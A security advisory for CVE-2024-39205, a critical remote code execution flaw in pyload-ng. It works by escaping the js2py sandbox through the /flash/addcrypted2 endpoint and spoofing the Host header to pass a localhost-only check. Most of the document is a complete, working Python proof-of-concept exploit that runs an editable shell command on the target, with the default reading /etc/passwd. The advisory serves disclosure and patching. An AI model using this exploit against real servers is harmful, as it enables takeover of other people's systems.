# pyload-ng vulnerable to RCE with js2py sandbox escape

**GHSA**: GHSA-r9pp-r4xf-597r | **CVE**: CVE-2024-39205 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-94

**Affected Packages**:
- **pyload-ng** (pip): <= 0.5.0b3.dev85

## Description

### Summary
Any pyload-ng running under python3.11 or below are vulnerable under RCE. Attacker can send a request containing any shell command and the victim server will execute it immediately.

### Details
js2py has a vulnerability of sandbox escape assigned as [CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape), which is used by the `/flash/addcrypted2` API endpoint of pyload-ng. Although this endpoint is designed to only accept localhost connection, we can bypass this restriction using HTTP Header, thus accessing this API and achieve RCE.
 
### PoC

The PoC is provided as `poc.py` below, you can modify the shell command it execute:

```python
import socket
import base64
from urllib.parse import quote

host, port = input("host: "), int(input("port: "))

payload = """
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator;"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {
    return n11
}

"""

crypted_b64 = base64.b64encode(b"1234").decode()

data = f"package=pkg&crypted={quote(crypted_b64)}&jk={quote(payload)}"

request = f"""\
POST /flash/addcrypted2 HTTP/1.1
Host: 127.0.0.1:9666
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(data)}

{data}
""".encode().replace(b"\n", b"\r\n")

def main():

    s = socket.socket()
    s.connect((host, port))

    s.send(request)
    response = s.recv(1024).decode()
    print(response)

if __name__ == "__main__":
    main()


```

### Impact

Anyone who runs the latest version (<=0.5.0b3.dev85) of  pyload-ng under python3.11 or below. pyload-ng doesn't use js2py for python3.12 or above.

